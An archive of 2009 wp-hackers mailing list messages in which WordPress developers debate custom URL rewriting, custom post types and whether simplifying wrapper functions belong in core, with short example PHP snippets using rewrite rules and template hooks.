	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
Message-ID: <566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>

> I said before that I'd give you a simple example. This might be too
> simple, but it should explain a few things.

Thanks for giving some concrete examples.

> function plugin_add_custom_urls() {
>  add_rewrite_rule('products/(.*)[/]?$',
> 'index.php?post_type=$matches[1]', 'top');
>  add_rewrite_tag('%post_type%','.*');
> }
> add_action('init', 'plugin_add_custom_urls');

First, that's far more complicated than it should be if this is something people will be doing a lot. But let's ignore that for a moment.

> add_rewrite_rule adds the rewrite rule to do products/whatever. The
> "whatever" gets set to the post_type query variable.

Unless I misunderstand, that's not I'm looking for.  Using your example, this might be what I'm looking for (not sure about the "add_rewrite_tag()" as I don't really understand what it does):

function plugin_add_custom_urls() {
 add_rewrite_rule('products/(.*)[/]?$',
'index.php?post_type=product&pagename=$matches[1]', 'top');
 add_rewrite_tag('%post_type%','.*');
}
add_action('init', 'plugin_add_custom_urls');

I can't test any of this at the moment because I upgraded MySQL and it blew away all my databases. Grrr.

> Now, because wp_query already supports post_type as an input
> parameter, I don't have to change anything along those lines. If it
> didn't, I'd have to add a filter hooked to 'posts_where' to add the
> additional where clause.

Can I assume that post_type is not supported until 2.9?  It doesn't seem to work in 2.8 (which is what I'm working with.)

I'm okay to delay solutions to 2.9 since it's imminent, but want to make it clear the simple option you propose wasn't available 6 months ago when I wrote my plugin.

> But, the resulting query SQL that this generates is this:
> SELECT SQL_CALC_FOUND_ROWS  wp_posts.* FROM wp_posts  WHERE 1=1  AND
> wp_posts.post_type = 'whatever' AND (wp_posts.post_status = 'publish'
> OR wp_posts.post_author = 1 AND wp_posts.post_status = 'private')
> ORDER BY wp_posts.post_date DESC LIMIT 0, 10
> 
> Note that it's selecting on wp_posts.post_type='whatever', which is
> something I think you wanted to do.

And that is all great.  It's what I really wanted to happen when I was working on it 6 months ago.

> You also wanted to redirect to a specific custom template based on
> this, I believe. That would be along these lines:
> 
> function plugin_add_template() {
>  if (get_query_var('post_type') == 'whatever') {
>    locate_template(array('custom/product.php'),true);
>    exit;
>  }
> }
> add_action('template_redirect', 'plugin_add_template');

Again, too complex for doing often.  But let's hold that thought too...

> Now, in my template redirection function, I could do
> get_query_var('product') and act accordingly. Since we set the
> post_id, the wp_query we get there is going to have the post with ID
> 12345, unless I add more filters to modify its contents.
> 
> Does this help explain things a bit better? I know it's not a complete
> example, but these seem to accomplish your goals to me. They add a
> rewrite, let you modify the query a bit, and provide you with a custom
> template. You could wrap them in a function to make them easier to
> call as well, I suppose.

It helps yes.  OTOH, it's not much different from what I did before in that it seems to be leveraging 2.9 functionality I had no access to in 2.8.

Also, it requires a level of complexity that few if any theme developers will go to.  Themers *will* be willing to use a simplifying layer like what I showed with add_custom_url() and I strongly believe such a functionality is needed.  Yes it will not cover every potential use case as the lower level examples can but it will cover the most common use cases and make them very easy to implement.

I'll try to implement add_custom_url() on the 2.9 platform and submit it as a patch soon.

-Mike

From scribu at gmail.com  Thu Dec  3 16:43:03 2009
From: scribu at gmail.com (scribu)
Date: Thu, 3 Dec 2009 18:43:03 +0200
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
Message-ID: <349fe48b0912030843s4a84030h87068a9c2d8783b7@mail.gmail.com>

> My reaction is to think you don't understand my visions because I'm
looking to make it more generic not less, and my perception of your
criticisms is that you are trying to constrain it to be less so.  Of course
that's all my perception which is probably not the reality.

> There I have to disagree.  I am not trying to constrain the system, I am
trying to creating a layer that simplifies a very common use case. The
existing layer still exists when my layer is on top of it so there is
nothing constrained, only common use cases simplified.

Mike, it seems to me that you're contradicting yourself.


-- 
http://scribu.net

From mikeschinkel at newclarity.net  Thu Dec  3 16:51:51 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 11:51:51 -0500
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <349fe48b0912030843s4a84030h87068a9c2d8783b7@mail.gmail.com>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com>
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com>
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com>
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com>
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
	<349fe48b0912030843s4a84030h87068a9c2d8783b7@mail.gmail.com>
Message-ID: <CBFAD078-E36C-45C6-9E86-F155966D75E5@newclarity.net>

On Dec 3, 2009, at 11:43 AM, scribu wrote:
>> My reaction is to think you don't understand my visions because I'm
> looking to make it more generic not less, and my perception of your
> criticisms is that you are trying to constrain it to be less so.  Of course
> that's all my perception which is probably not the reality.
> 
>> There I have to disagree.  I am not trying to constrain the system, I am
> trying to creating a layer that simplifies a very common use case. The
> existing layer still exists when my layer is on top of it so there is
> nothing constrained, only common use cases simplified.
> 
> Mike, it seems to me that you're contradicting yourself.

Yes, taken out of the full context as you have I would have to agree. ;-)

-Mike 

From mikeschinkel at newclarity.net  Thu Dec  3 16:55:56 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 11:55:56 -0500
Subject: [wp-hackers] Database structure Wordpress
In-Reply-To: <161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
References: <C98C6445-D7ED-44CE-AA53-EB3FAFD0022B@gmail.com>
	<161617690912030712v5edc0858uc8b6d9bfaef26260@mail.gmail.com>
Message-ID: <77389C5B-E8EB-4C47-8AA7-5C43D4243727@newclarity.net>

On Dec 3, 2009, at 10:12 AM, Otto wrote:
> You're not going to get a whole lot of support for this idea. Mainly
> because it's been demonstrated that such a design is less efficient
> and slower than the current scheme of keeping things together.

I agree on this point because Matt is (sadly) adamantly against it.

> Let's say you have a table for each post type. What happens when you
> need to pull from more than one post type and interleave them together
> based on, say, date? Now you're pulling from two tables. And since you
> want metadata to be columns, they don't match each other either. So
> you need two SELECTs and then PHP code to mix them up. Whereas if you
> keep all posts in the same table with a post_type column, it's one
> SELECT and no special PHP.

However, you are making assumptions that are invalid; there are other ways to do it which is what but Drupal CCK and Pods for WordPress do; a central posts table and then specific tables for the unique fields needs for each post type. 

> Metadata as columns doesn't make any sense either.

I don't follow what you mean here.  

> The only reason to 
> have a column is if every post, or most of them, will have that data
> filled in. Also, having a column usually means pulling the data from
> that column every time, else you'd have to requery for it later
> anyway. And if you have to requery for it anyway, then it's more
> efficient to store the data in a separate meta table, using key value
> pairs. Indexing makes such a query faster, and the space requirements
> are much less since you don't have extraneous columns.

Actually, having tables like follow works quite well for performance:

SELECT p.*, c.* FROM wp_posts p INNER JOIN wp_custom_products c ON c.post_id=p.id


> It's all well and good to have good database design, but the
> difference is that good design does not equate to "faster" in real
> world applications. The goal of "high performance" is often in direct
> conflict with correct relational database design. 

Unless you are talking about things like Map/Reduce or simply carrying redundant data across several tables to improve performance, I'm afraid I'm going to challenge you for concrete examples here that are backed up with something other than opinion.

-Mike Schinkel


From wp-hackers at striderweb.com  Thu Dec  3 16:56:17 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 10:56:17 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
Message-ID: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>

Okay, I'm splitting this to a new thread for a reason.  Clearly there are people who would like to see a better API for custom Post Types.  I would like to discuss in this thread *specifics* of how that would be best implemented.

PLEASE let's avoid discussion of IF we should do it.  There are already two other threads for that discussion (most recently "One CMS to Rule Them All").  This is for people who DO like the idea to discuss *specifics* of how it might/should be implemented.

Note: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now.  We're simply adding flexibility for plugins to be able to modify things easily and consistently.

Specifically, what functions need to be created?  What should we not overlook?  What obstacles or dangers should we avoid?

Below is my previous post regarding the topic. ***Please read it before replying to this thread.***  There's a bit more new at the bottom as well.

It gets the ball rolling with  an overall conceptual overview of how such a thing should be implemented.  Specifically, I think a HUGE amount of flexibility can be added to WordPress **without adding a lot of bloat**.

That last bit is important, as I think bloat is one of the main reasons a lot of people *don't* want to add this API.  If we can't do it without significant bloat, it's not worth doing.


> I'll start by stating overall position, then get on to specifics
> 
> 1) I heartily agree with and support the prospect of creating API functions the make it easy (simple!) for plugins to add custom post types.
> 
> 2) I also strongly support abstracting out "Edit <post type x>" pages in Admin so that plugins can say "I need an edit page for Post Type X.  It needs (for example) the Main Text Box, Tags, and Excerpt.  Bang!  Done."
> 
> 3) I understand the wariness of bloating the core with extraneous additions, but I do not believe that this situation needs to be such.  I believe that it could be done by creating a few robust, flexible functions, and a bit of reorganization.
> 
> Now, some specifics:
> 
> I'm not overly familiar with the Custom Post Type code (yet) so I can't make precise suggestions, BUT I would like to point out a patch that I recently created, that has been committed for WP 2.9.  This patch is in ways similar, in that I saw a need and created a patch that
> 
> 1) adds flexibility to the area to which it applies
> 
> 2) Consolidates code in areas where different functions has substantially identical code.
> 
> 3) Reduces redundancy in multiple places where (for example) a series of parameters had to be specified twice.
> 
> 	3a) Said parameters are readily modified by plugins
> 
> 4) Created a new function that can be used by plugins to very easily create custom functions that were much more difficult (and again, redundant) to do before.  A few pre-existing functions are recreated as wrappers to the new "core" function.
> 
> 	4a) The new "core" function is written in a way that it can automatically add hooks to any new wrapper functions that may be created by plugins
> 
> 5) No bloat!  Adds a single new function; and two pre-existing functions are significantly simplified.
> 
> Here's the ticket:
> 
> <http://core.trac.wordpress.org/ticket/8964>
> 
> Specifically, get_plugin_data() and get_theme_data() used to be completely separate pieces of code, but did basically the same thing.  I abstracted out a new function, get_file_data(), and both of the original functions are basically wrappers that use the new one for their core functionality.  As a bonus, plugins can also put get_file_data() in a custom wrapper to read headers off of custom "add on" files of their own.  (Also pay attention to the $context parameter!)
> 
> So how does this apply to to custom Post Types?
> 
> We create a new function that is basically "add_post_edit_page".  Parameters are a location, the Post Type to which it applies, and an array containing a list of features that the Edit Page needs (Text Box, Categories, Tags, Excerpt, etc.).
> 
> Then we abstract the existing code so that the two standard pages, Edit Post, and Edit Page, use this new function.

I'm thinking that the add_post_edit_page should have the following parameters:

* Post Type
* Location in the Menu
* array listing "Page Pieces" (meta boxes) -- e.g. text box, categories, etc.
* $context -- which is basically the name that will be inserted into the standard hook that allows plugins to insert or remove "page pieces"

This will most likely be a wrapper of some sort around the existing "add menu item" function

There will be two hooks standard to all Edit-X pages:
* One to allow plugins to modify pieces on ALL Edit pages
* One to allow plugins to modify pieces on any Edit page that was given a $context

Again: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now.

Ideas and suggestion?

Stephen

-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Thu Dec  3 16:59:26 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 3 Dec 2009 10:59:26 -0600
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
Message-ID: <1B9C33A5-2373-48A8-87A7-E6516157F309@striderweb.com>


On Dec 3, 2009, at 10:56 AM, Stephen Rider wrote:

> Okay, I'm splitting this to a new thread for a reason.  Clearly there are people who would like to see a better API for custom Post Types.  I would like to discuss in this thread *specifics* of how that would be best implemented.

Also, let us for the moment please avoid (in this thread) discussion of URL redirecting, as that can easily take over the whole thread.

Regards,
Stephen


-- 
Stephen Rider
http://striderweb.com/





From otto at ottodestruct.com  Thu Dec  3 17:01:15 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 11:01:15 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com> 
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com> 
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
Message-ID: <161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>

On Thu, Dec 3, 2009 at 10:37 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> First, that's far more complicated than it should be if this is something people will be doing a lot.

I fail to understand how two function calls is at all "complicated".
Yes, you need to know regular expressions. They're not that complex.

> Unless I misunderstand, that's not I'm looking for. ?Using your example, this might be what I'm looking for (not sure about the "add_rewrite_tag()" as I don't really understand what it does):

You know how custom permalinks work? Like /%year%/%month%/%postname%
and so forth?

%postname% is a rewrite tag. It takes whatever is in that space and
puts it into the $wp_query->postname variable.

When you add a rewrite tag, you're creating a new one of those. The
second parameter is a limiter, so I can limit the value to be all
digits or something, if I wanted. The .* is simply a way of saying it
can be anything (regular expressions again).

So I can define a tag like, say, product. The rewrite matches
something and puts it into the URL as index.php?product=whatever.
Because I've defined "product" as being okay, that gets read and put
into my wp_query object.

> Can I assume that post_type is not supported until 2.9? ?It doesn't seem to work in 2.8 (which is what I'm working with.)

The post_type variable is supported in 2.8, but *custom* post_type
support wasn't added until 2.9.

>> function plugin_add_template() {
>> ?if (get_query_var('post_type') == 'whatever') {
>> ? ?locate_template(array('custom/product.php'),true);
>> ? ?exit;
>> ?}
>> }
>> add_action('template_redirect', 'plugin_add_template');
>
> Again, too complex for doing often. ?But let's hold that thought too...

I'm utterly floored by this statement. What part of that is at all
"complex"? That's about the simplest possible code I can imagine to do
something like this. If you want to abstract 10 lines of code into 1,
then that's fine, but that sort of nonsense shouldn't be core code.


> It helps yes. ?OTOH, it's not much different from what I did before in that it seems to be leveraging 2.9 functionality I had no access to in 2.8.
>
> Also, it requires a level of complexity that few if any theme developers will go to. ?Themers *will* be willing to use a simplifying layer like what I showed with add_custom_url() and I strongly believe such a functionality is needed. ?Yes it will not cover every potential use case as the lower level examples can but it will cover the most common use cases and make them very easy to implement.
>
> I'll try to implement add_custom_url() on the 2.9 platform and submit it as a patch soon.

I would suggest that you submit it as a plugin instead. I don't think
that this sort of needless wrappers and abstraction should be in the
core.

-Otto
Sent from Memphis, TN, United States

From otto at ottodestruct.com  Thu Dec  3 17:20:00 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 11:20:00 -0600
Subject: [wp-hackers] One CMS to Rule Them All (was This was painful to
	read...)
In-Reply-To: <8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
References: <161617690912021019x352c941fqb4a7393c0d8cef28@mail.gmail.com> 
	<7b4922320912021112g1125b466qee1af65ba3a31dd7@mail.gmail.com> 
	<C2F2ABDB-517D-4508-953A-CF61D70419A8@newclarity.net>
	<161617690912021422k2abfe799v1c99190dca3f5666@mail.gmail.com> 
	<C467409A-DE43-49A7-BE43-EF6FC0DE5A34@newclarity.net>
	<161617690912030654x794bbbf2xe2c2ea644ad0c7c0@mail.gmail.com> 
	<8E9CD77F-65C2-4B8F-BF84-15725466DDCA@newclarity.net>
Message-ID: <161617690912030920h6036c8dbw60c1f84af8ec7726@mail.gmail.com>

On Thu, Dec 3, 2009 at 10:10 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> There I have to disagree. ?I am not trying to constrain the system, I am trying to creating a layer that simplifies a very common use case. The existing layer still exists when my layer is on top of it so there is nothing constrained, only common use cases simplified.

I disagree that your use case is common. I think you're being overly
limited by what you want to do, and I do not think that you can expand
that out into the general population.

> I don't understand the "attaching to a fixed template" issue. As opposed to what, a variable template?

Yes, a variable template. As in maybe I have a products directory, and
whatever.php is inside it. I can also have an index.php inside it as a
fallback position, perhaps. This is how much of the theme hierarchy
works, after all.

> BTW, my code that I sent you also supports callbacks, is that what you meant? i.e.
>
> add_custom_url( array(
> ?'url_template' => 'foo-page',
> ?'url_type' => 'callback',
> ?'callback' => 'do_foo_page',
> ));

I saw the callbacks, but have no idea what they do. What is the URL
you're defining here? /foo-page? You can do that rather easily by
adding a rewrite endpoint.

add_rewrite_endpoint('foo-page', EP_ROOT);

The EP_ROOT is where you want the endpoint to be enabled. In this
case, just off the root URL, and not all single post pages, archives,
etc. Full list of possibles is in rewrite.php.

Anyway, then in your template_redirect action function, you can do
get_query_var('foo-page') to detect when your URL endpoint is
recognized. It'll be set to 1 when it's there.

> Are you saying WordPress shouldn't support custom post templates?

I'm saying that it shouldn't support simplistic and slightly insane
ways of doing them, yes. If you want to do a custom post template,
then there's a very easy method that already exists to do that.

> You mean like how permalinks have special names like "postname" and "monthnum?" ? So what's wrong here?

Nothing is wrong there. That's why we have add_rewrite_tag,
specifically to add those variables. That's the whole *purpose* of it.
What you want in this respect already exists.

> Yes, a custom post type. From what I've seen that's the most common use case for custom URLs by far. ?You have an issue with simplifying common use cases?

I disagree that it is a common use case, especially since custom post
types have not been well supported until 2.9 and didn't even exist
before 2.7.

> If you feel the need to continue criticizing please explain why it's bad to have a simplifying layer instead of arguing for a layer that does thing exactly as complicated as the layer below it.

Few reasons:
- Creating a simplifying layer creates unnecessary code maintenance
headaches. What happens when the underlying code changes? Now your
layer must change with it.
- Layers make things slower. This is just a fact. More code = more
memory used = slower.
- Layers create de-facto ways of doing things that forces people into
a specific mindset. In other words, if we create something that lets
people tie URLs to custom post types, then people will do that instead
of thinking of the right way of doing what they want to do. It's
better to leave it more open, to encourage original thinking.
- The existing way of doing it, in this specific case, is not that
bloody complicated. You're talking about reducing 10-15 lines of code
down to 1 by creating a function which would have to be at least 60-70
lines to do properly. That just makes zero sense.

Finally: This really belongs in a plugin. You're wanting to do
something that I doubt that even a sizable minority of WordPress users
really want to do.

> Are you actually arguing that WordPress should not support any additional layers that simplify things? ?Especially things that many people have expressed both an interest in doing and a concern that it's far too difficult? ?Seriously?

No, I'm arguing that WordPress should not support *this* layer which
you're proposing.

> And my "vision" (which you incorrectly characterize) is to identify common use cases and make them easy. ?To handle the common use case of a custom post type is currently *not* easy, but should be.

WordPress 2.9 makes it much easier, as I have demonstrated.

-Otto
Sent from Memphis, TN, United States

From mikeschinkel at newclarity.net  Thu Dec  3 17:29:22 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 12:29:22 -0500
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
References: <4B0C80C1.5070502@santosj.name>
	<161617690911261124v3a8258abl46c603abdf5efe9a@mail.gmail.com>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net>
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com>
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com>
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com>
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com>
Message-ID: <A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>

On Dec 3, 2009, at 12:01 PM, Otto wrote:
> On Thu, Dec 3, 2009 at 10:37 AM, Mike Schinkel
> <mikeschinkel at newclarity.net> wrote:
>> First, that's far more complicated than it should be if this is something people will be doing a lot.
> 
> I fail to understand how two function calls is at all "complicated".

It's not that there are two calls, it's the complex parameters that must be passed. 

> Yes, you need to know regular expressions. They're not that complex.


Maybe you should drive down from Tennessee to Atlanta to the WordPress users group and/or the Atlanta Bloggers group and ask for a show of hands for how many people understand and can use regular expressions?  My guess is you *might* get 2 in 100 to raise their hands.

See I think you are so advanced it's difficult for you to understand just how hard some of this stuff is for most users (the irony? Most people around here know me as the "advanced" guy. :-)

>> Unless I misunderstand, that's not I'm looking for.  Using your example, this might be what I'm looking for (not sure about the "add_rewrite_tag()" as I don't really understand what it does):
> 
> You know how custom permalinks work? Like /%year%/%month%/%postname%
> and so forth?
> 
> %postname% is a rewrite tag. It takes whatever is in that space and
> puts it into the $wp_query->postname variable.
> 
> When you add a rewrite tag, you're creating a new one of those. The
> second parameter is a limiter, so I can limit the value to be all
> digits or something, if I wanted. The .* is simply a way of saying it
> can be anything (regular expressions again).

I didn't understand the limiter part, thanks; it helps.

>> Can I assume that post_type is not supported until 2.9?  It doesn't seem to work in 2.8 (which is what I'm working with.)
> 
> The post_type variable is supported in 2.8, but *custom* post_type
> support wasn't added until 2.9.

But it still doesn't work in 2.8, right?   At least it didn't work when I tried to use the URL with a post_type parameter on an existing live site.  Anyway, not important.

>>> function plugin_add_template() {
>>>  if (get_query_var('post_type') == 'whatever') {
>>>    locate_template(array('custom/product.php'),true);
>>>    exit;
>>>  }
>>> }
>>> add_action('template_redirect', 'plugin_add_template');
>> 
>> Again, too complex for doing often.  But let's hold that thought too...
> 
> I'm utterly floored by this statement. What part of that is at all
> "complex"? That's about the simplest possible code I can imagine to do
> something like this. If you want to abstract 10 lines of code into 1,
> then that's fine, but that sort of nonsense shouldn't be core code.

Conversely I'm floored by your adamancy about not wanting to make this common need approachable.  The code you mention is fine for plugins but not fine for themes. 

The skill level for PHP coding among plugin developers is much higher than for your *average* themer who in many cases use cuts and pastes PHP code from examples (no hate mail from you themers highly skilled in PHP please; you are in the minority.) In your example the themer has to know how to hook template redirect, to use get_query_var(), to use locate_template(), to pass an array to locate_template, that it accepts a second param of true (what's true?) and that it should exit.  FAR too much conceptual overload for the themer to bother with and more importantly, for them to have to debug. 

Give the themer a break and make it easy as I did with add_custom_url().

> I would suggest that you submit it as a plugin instead. I don't think
> that this sort of needless wrappers and abstraction should be in the
> core.

I already have a plugin.  IMO this sort of wrapper is exactly what should be in the core, so that URL rewriting it approachable to the everyday user of WordPress and not just for coding wizards like yourself.

-Mike 

From mikeschinkel at newclarity.net  Thu Dec  3 17:32:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 3 Dec 2009 12:32:53 -0500
Subject: [wp-hackers] Custom Post - implementation specifics
In-Reply-To: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
References: <BA11F8C4-C212-46A5-84C2-C37AD621FEB3@striderweb.com>
Message-ID: <0D58EC5B-F107-42B4-AC05-6FAF38A88D67@newclarity.net>

Kudos.  I have no suggestions at this point. I think you are headed in the right direction.

-Mike

On Dec 3, 2009, at 11:56 AM, Stephen Rider wrote:

> Okay, I'm splitting this to a new thread for a reason.  Clearly there are people who would like to see a better API for custom Post Types.  I would like to discuss in this thread *specifics* of how that would be best implemented.
> 
> PLEASE let's avoid discussion of IF we should do it.  There are already two other threads for that discussion (most recently "One CMS to Rule Them All").  This is for people who DO like the idea to discuss *specifics* of how it might/should be implemented.
> 
> Note: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now.  We're simply adding flexibility for plugins to be able to modify things easily and consistently.
> 
> Specifically, what functions need to be created?  What should we not overlook?  What obstacles or dangers should we avoid?
> 
> Below is my previous post regarding the topic. ***Please read it before replying to this thread.***  There's a bit more new at the bottom as well.
> 
> It gets the ball rolling with  an overall conceptual overview of how such a thing should be implemented.  Specifically, I think a HUGE amount of flexibility can be added to WordPress **without adding a lot of bloat**.
> 
> That last bit is important, as I think bloat is one of the main reasons a lot of people *don't* want to add this API.  If we can't do it without significant bloat, it's not worth doing.
> 
> 
>> I'll start by stating overall position, then get on to specifics
>> 
>> 1) I heartily agree with and support the prospect of creating API functions the make it easy (simple!) for plugins to add custom post types.
>> 
>> 2) I also strongly support abstracting out "Edit <post type x>" pages in Admin so that plugins can say "I need an edit page for Post Type X.  It needs (for example) the Main Text Box, Tags, and Excerpt.  Bang!  Done."
>> 
>> 3) I understand the wariness of bloating the core with extraneous additions, but I do not believe that this situation needs to be such.  I believe that it could be done by creating a few robust, flexible functions, and a bit of reorganization.
>> 
>> Now, some specifics:
>> 
>> I'm not overly familiar with the Custom Post Type code (yet) so I can't make precise suggestions, BUT I would like to point out a patch that I recently created, that has been committed for WP 2.9.  This patch is in ways similar, in that I saw a need and created a patch that
>> 
>> 1) adds flexibility to the area to which it applies
>> 
>> 2) Consolidates code in areas where different functions has substantially identical code.
>> 
>> 3) Reduces redundancy in multiple places where (for example) a series of parameters had to be specified twice.
>> 
>> 	3a) Said parameters are readily modified by plugins
>> 
>> 4) Created a new function that can be used by plugins to very easily create custom functions that were much more difficult (and again, redundant) to do before.  A few pre-existing functions are recreated as wrappers to the new "core" function.
>> 
>> 	4a) The new "core" function is written in a way that it can automatically add hooks to any new wrapper functions that may be created by plugins
>> 
>> 5) No bloat!  Adds a single new function; and two pre-existing functions are significantly simplified.
>> 
>> Here's the ticket:
>> 
>> <http://core.trac.wordpress.org/ticket/8964>
>> 
>> Specifically, get_plugin_data() and get_theme_data() used to be completely separate pieces of code, but did basically the same thing.  I abstracted out a new function, get_file_data(), and both of the original functions are basically wrappers that use the new one for their core functionality.  As a bonus, plugins can also put get_file_data() in a custom wrapper to read headers off of custom "add on" files of their own.  (Also pay attention to the $context parameter!)
>> 
>> So how does this apply to to custom Post Types?
>> 
>> We create a new function that is basically "add_post_edit_page".  Parameters are a location, the Post Type to which it applies, and an array containing a list of features that the Edit Page needs (Text Box, Categories, Tags, Excerpt, etc.).
>> 
>> Then we abstract the existing code so that the two standard pages, Edit Post, and Edit Page, use this new function.
> 
> I'm thinking that the add_post_edit_page should have the following parameters:
> 
> * Post Type
> * Location in the Menu
> * array listing "Page Pieces" (meta boxes) -- e.g. text box, categories, etc.
> * $context -- which is basically the name that will be inserted into the standard hook that allows plugins to insert or remove "page pieces"
> 
> This will most likely be a wrapper of some sort around the existing "add menu item" function
> 
> There will be two hooks standard to all Edit-X pages:
> * One to allow plugins to modify pieces on ALL Edit pages
> * One to allow plugins to modify pieces on any Edit page that was given a $context
> 
> Again: If this is done correctly, a default install of WordPress should be NO DIFFERENT than it is now.
> 
> Ideas and suggestion?
> 
> Stephen
> 
> -- 
> Stephen Rider
> http://striderweb.com/
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From otto at ottodestruct.com  Thu Dec  3 17:43:30 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 3 Dec 2009 11:43:30 -0600
Subject: [wp-hackers] The problem with WP_Rewrite <<< RE: Options for
	Controller - Views
In-Reply-To: <A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
References: <4B0C80C1.5070502@santosj.name>
	<8B9D5A49-3CE6-4661-9B3B-EBCF617B3E99@newclarity.net> 
	<161617690911271131t6d21b3f6y35bc814f73f09a06@mail.gmail.com> 
	<E7B7D271-B75D-4561-BE5F-8E054D62F7A7@newclarity.net>
	<161617690911281113q2e5f0460m12364d97e8a1cbfa@mail.gmail.com> 
	<37AD065D-6910-4110-A9DA-21B63ED65CCA@newclarity.net>
	<161617690912030804k11df1471h18f98d298b5a8e7@mail.gmail.com> 
	<566F50E8-9066-4A0B-B486-2BC2574CA946@newclarity.net>
	<161617690912030901h7ca37287t6a46c11f135388f4@mail.gmail.com> 
	<A5DC889F-117C-483F-91E8-840B0B98E165@newclarity.net>
Message-ID: <161617690912030943r270d5237xb35de5f73fcde502@mail.gmail.com>

On Thu, Dec 3, 2009 at 11:29 AM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Maybe you should drive down from Tennessee to Atlanta to the WordPress users group and/or the Atlanta Bloggers group and ask for a show of hands for how many people understand and can use regular expressions? ?My guess is you *might* get 2 in 100 to raise their hands.
>
> See I think you are so advanced it's difficult for you to understand just how hard some of this stuff is for most users (the irony? Most people around here know me as the "advanced" guy. :-)

... To be quite blunt, if a person is not capable of understanding
regular expressions, and can't look in a book for 10 minutes to figure
out what they want to do, then they should not be writing code of any
kind. They should stick to something simple, like flipping burgers.

Obviously, I don't expect an end user to understand regular
expressions. I wouldn't want people making fields to put regexp on the
admin screens, for example.

But there's a certain level of knowledge you need to obtain to write
code, and to write PHP code in particular. Simple Regular Expressions
is one of those most basic levels of things you need to know, just
after string handling.

Do I expect a plugin author to understand regexp? Absolutely.
